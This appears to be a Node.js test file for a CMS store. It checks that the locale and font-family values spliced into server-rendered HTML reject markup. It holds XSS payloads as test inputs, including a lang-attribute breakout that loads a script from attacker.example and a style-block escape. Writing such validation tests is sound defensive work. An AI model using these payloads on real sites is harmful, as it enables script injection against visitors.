/**
 * Store tests for the two CMS values that reach the server-rendered marketing
 * HTML as raw text: the default locale (spliced into <html lang>) and the
 * design font families (spliced into an inline <style> block).
 *
 * Both used to be stored as any string at all, so a CMS admin — or a site
 * import bundle they did not author — could park markup in them and have it
 * served to every anonymous visitor. These pin the way in AND the way out:
 * a row written before the check existed must not keep rendering.
 *
 * Same harness as cmsStore.analytics.test.js: the cmsStore logic runs REAL on
 * an in-memory config table, with ./configStore and ../db mocked. Loading the
 * real configStore would keep the event loop alive with Postgres retries.
 *
 * Run: node --test stores/cmsStore.locale.test.js
 */

const test = require('node:test');
const assert = require('node:assert');
const { installCmsStoreMocks } = require('./cmsStore.testkit');

const { configState } = installCmsStoreMocks();

const cmsStore = require('./cmsStore');
const { DESIGN_DEFAULTS } = require('../i18n/defaults/cmsDefaults');

// The payload that made this worth pinning: cms_default_locale is read on
// every public request and spliced into the <html lang> attribute, so no
// publish step is needed to poison the whole site.
const LANG_PAYLOAD = 'en"><script src=https://attacker.example/x.js></script><b x="';

// ── default locale ──────────────────────────────────────────────────

test('isValidLocale accepts language tags and nothing else', () => {
    for (const good of ['en', 'nl', 'pt-br', 'zh-hans-cn']) {
        assert.strictEqual(cmsStore.isValidLocale(good), true, good);
    }
    for (const bad of [LANG_PAYLOAD, 'en"', 'en>', '', 'e', 'english-but-far-too-long-a-subtag', 42, null]) {
        assert.strictEqual(cmsStore.isValidLocale(bad), false, String(bad));
    }
});

test('setDefaultLocale refuses a locale carrying markup', async () => {
    await assert.rejects(() => cmsStore.setDefaultLocale(LANG_PAYLOAD), /Invalid locale/);
    await assert.rejects(() => cmsStore.setDefaultLocale('en"'), /Invalid locale/);
    // The store must not have written anything.
    assert.strictEqual(await cmsStore.getDefaultLocale(), 'en');
});

test('setDefaultLocale normalises and round-trips a real tag', async () => {
    await cmsStore.setDefaultLocale('  NL  ');
    assert.strictEqual(await cmsStore.getDefaultLocale(), 'nl');
    await cmsStore.setDefaultLocale('pt-BR');
    assert.strictEqual(await cmsStore.getDefaultLocale(), 'pt-br');
    await cmsStore.setDefaultLocale('en');
});

test('a row poisoned before the check existed does not keep rendering', async () => {
    // Written straight into the table, bypassing setDefaultLocale — exactly
    // the state an install that ran the old code would be left in.
    configState.map.set('cms_default_locale', LANG_PAYLOAD);
    assert.strictEqual(await cmsStore.getDefaultLocale(), 'en',
        'the read path must distrust stored data, not only the write path');
    assert.strictEqual(await cmsStore.getDefaultLocale({ fresh: true }), 'en');
    configState.map.delete('cms_default_locale');
});

// ── design fonts ────────────────────────────────────────────────────

test('a design font name carrying markup falls back to the default', async () => {
    const { id: siteId } = await cmsStore.createProject({ name: 'Fonts site' });
    const site = await cmsStore.getProject(siteId);

    site.design = {
        ...site.design,
        fonts: {
            heading: '</style><script>alert(1)</script>',
            body: 'Inter"; background: url(//evil.example)',
            mono: 'IBM Plex Mono',
        },
    };
    const saved = await cmsStore.setProject(siteId, site);

    assert.strictEqual(saved.design.fonts.heading, DESIGN_DEFAULTS.fonts.heading);
    assert.strictEqual(saved.design.fonts.body, DESIGN_DEFAULTS.fonts.body);
    // A well-formed family is untouched.
    assert.strictEqual(saved.design.fonts.mono, 'IBM Plex Mono');

    const reread = await cmsStore.getProject(siteId);
    assert.strictEqual(reread.design.fonts.heading, DESIGN_DEFAULTS.fonts.heading);
});

test('an unknown but well-formed family still persists', async () => {
    // The font list is a shape check, not an allow-list: cmsBuilder/validate.js
    // warns `unknown_font` and the family falls back to the system stack at
    // render time. Turning that warning into a silent rewrite would be a
    // behaviour change, not a security fix.
    const { id: siteId } = await cmsStore.createProject({ name: 'Custom font site' });
    const site = await cmsStore.getProject(siteId);
    site.design = { ...site.design, fonts: { ...site.design.fonts, heading: 'Playfair Display' } };
    const saved = await cmsStore.setProject(siteId, site);
    assert.strictEqual(saved.design.fonts.heading, 'Playfair Display');
});
